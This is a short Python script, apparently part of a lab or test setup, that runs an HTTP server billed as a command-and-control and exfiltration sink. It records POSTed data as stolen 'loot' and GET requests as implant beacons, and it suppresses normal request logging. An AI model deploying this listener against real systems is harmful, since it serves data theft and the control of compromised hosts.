#!/usr/bin/env python3
"""Tiny C2/exfil sink. Captures POSTed data (and /beacon GETs) to the loot dir."""
import os, sys
from http.server import BaseHTTPRequestHandler, HTTPServer

LOOT = os.environ.get("LOOT", "/loot")
LOG = os.path.join(LOOT, "09-exfil-received.log")
os.makedirs(LOOT, exist_ok=True)


class H(BaseHTTPRequestHandler):
    def _log(self, kind):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        with open(LOG, "a") as f:
            f.write(f"=== {kind} {self.path} from {self.client_address[0]} ===\n")
            if body:
                f.write(body + "\n")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def do_POST(self): self._log("EXFIL")
    def do_GET(self):  self._log("BEACON")
    def log_message(self, *a): pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
    print(f"[listener] capturing exfil on :{port} -> {LOG}")
    HTTPServer(("0.0.0.0", port), H).serve_forever()
